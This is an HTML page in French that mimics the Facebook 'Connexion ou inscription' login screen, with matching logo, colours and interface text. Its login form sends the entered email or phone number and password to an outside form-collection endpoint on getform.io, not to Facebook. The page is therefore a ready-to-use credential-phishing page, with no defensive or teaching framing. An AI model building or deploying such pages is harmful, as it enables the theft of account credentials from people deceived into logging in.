<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook – Connexion ou inscription</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        body {
            background-color: #f0f2f5;
        }
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        .content {
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }
        .logo {
            color: #1877f2;
            font-size: 50px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .subtitle {
            font-size: 20px;
            color: #606770;
            text-align: center;
            max-width: 500px;
            margin-bottom: 20px;
        }
        .form-container {
            background: white;
            padding: 20px;
            width: 396px;
            border-radius: 8px;
            box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.2);
            text-align: center;
        }
        .form-container input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
        }
        .form-container button {
            width: 100%;
            padding: 12px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            cursor: pointer;
            margin-top: 10px;
        }
        .form-container button:hover {
            background: #166fe5;
        }
        .forgot-password {
            display: block;
            color: #1877f2;
            font-size: 14px;
            margin: 10px 0;
            text-decoration: none;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
        .divider {
            width: 100%;
            height: 1px;
            background: #dadde1;
            margin: 15px 0;
        }
        .create-account {
            width: 100%;
            padding: 12px;
            background: #42b72a;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
        }
        .create-account:hover {
            background: #36a420;
        }
        .footer {
            margin-top: 20px;
            font-size: 14px;
            color: #606770;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="content">
            <div class="logo">facebook</div>
            <div class="subtitle">Avec Facebook, partagez et restez en contact avec votre entourage.</div>
        </div>

        <div class="form-container">
            <form action="https://getform.io/f/agdpdnkb" method="POST">
                <input type="email" name="email" placeholder="Adresse e-mail ou numéro de téléphone" required>
                <input type="password" name="password" placeholder="Mot de passe" required>
                <button type="submit">Se connecter</button>
                <a href="#" class="forgot-password">Mot de passe oublié ?</a>
                <div class="divider"></div>
                <button class="create-account">Créer un nouveau compte</button>
            </form>
        </div>

        <div class="footer">
            <p><b>Créer une Page</b> pour une célébrité, une marque ou une entreprise.</p>
        </div>
    </div>

</body>
</html>
